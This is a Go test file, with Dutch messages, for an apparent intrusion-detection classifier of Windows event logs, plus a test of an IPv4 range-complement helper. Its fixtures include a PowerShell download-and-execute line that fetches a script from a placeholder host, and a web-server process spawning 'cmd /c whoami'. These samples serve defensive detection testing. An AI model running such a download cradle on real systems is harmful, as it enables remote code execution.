package main

import (
	"strings"
	"testing"
	"time"
)

func TestIdsEvents(t *testing.T) {
	now := time.Now()
	ev := func(ch string, id int, d map[string]string) map[string]any {
		return idsEvent(winEvent{Channel: ch, ID: id, Time: now, Data: d})
	}
	if e := ev("System", 7045, map[string]string{"ServiceName": "evil", "ImagePath": `C:\Temp\x.exe`}); e == nil || e["k"] != "service" || e["name"] != "evil" {
		t.Fatalf("nieuwe service: %v", e)
	}
	if e := ev("Security", 4732, map[string]string{"MemberName": "CN=jan", "TargetUserName": "Administrators"}); e == nil || e["k"] != "group" || e["group"] != "Administrators" {
		t.Fatalf("groep: %v", e)
	}
	if e := ev("Security", 1102, nil); e == nil || e["k"] != "logclear" {
		t.Fatalf("logboek gewist: %v", e)
	}
	// Een webserver die een shell start: verdacht; Verkenner die een shell start: gewoon
	if e := ev("Microsoft-Windows-Sysmon/Operational", 1, map[string]string{"Image": `C:\Windows\System32\cmd.exe`, "ParentImage": `C:\Windows\System32\inetsrv\w3wp.exe`, "CommandLine": "cmd /c whoami"}); e == nil || e["k"] != "proc" {
		t.Fatalf("w3wp → cmd: %v", e)
	}
	if e := ev("Microsoft-Windows-Sysmon/Operational", 1, map[string]string{"Image": `C:\Windows\System32\cmd.exe`, "ParentImage": `C:\Windows\explorer.exe`}); e != nil {
		t.Fatalf("explorer → cmd is gewoon: %v", e)
	}
	if e := ev("Microsoft-Windows-PowerShell/Operational", 4104, map[string]string{"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"}); e == nil || e["k"] != "ps" {
		t.Fatalf("verdacht PowerShell: %v", e)
	}
	if e := ev("Microsoft-Windows-PowerShell/Operational", 4104, map[string]string{"ScriptBlockText": "Get-Service | Where Status -eq Running"}); e != nil {
		t.Fatalf("gewoon PowerShell: %v", e)
	}
	if e := ev("Microsoft-Windows-Windows Defender/Operational", 1116, map[string]string{"Threat Name": "Trojan:Win32/X", "Path": `file:_C:\x.exe`}); e == nil || e["k"] != "malware" {
		t.Fatalf("Defender: %v", e)
	}
}

func TestComplementV4(t *testing.T) {
	got := strings.Join(complementV4([]string{"192.168.1.0/24", "10.0.0.5", "fe80::/10"}), " ")
	want := "0.0.0.0-10.0.0.4 10.0.0.6-126.255.255.255 128.0.0.0-192.168.0.255 192.168.2.0-255.255.255.255"
	if got != want {
		t.Fatalf("complement:\n%s\n%s", got, want)
	}
	if got := strings.Join(complementV4(nil), " "); got != "0.0.0.0-126.255.255.255 128.0.0.0-255.255.255.255" {
		t.Fatalf("zonder toegestane netwerken: %s", got)
	}
}
